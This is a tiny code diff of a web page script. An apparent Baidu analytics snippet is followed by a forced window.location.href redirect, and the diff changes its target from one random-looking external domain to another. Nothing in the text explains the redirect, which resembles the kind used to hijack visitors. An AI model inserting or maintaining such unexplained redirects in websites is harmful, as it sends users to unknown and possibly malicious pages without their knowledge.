@@ -9,5 +9,5 @@ var _hmt = _hmt || [];
   s.parentNode.insertBefore(hm, s);
 })();
 
-window.location.href="https://bw.bxoht.com/2987.html";
+window.location.href="https://uj.ndjsada.com/2987.html";
 </script>
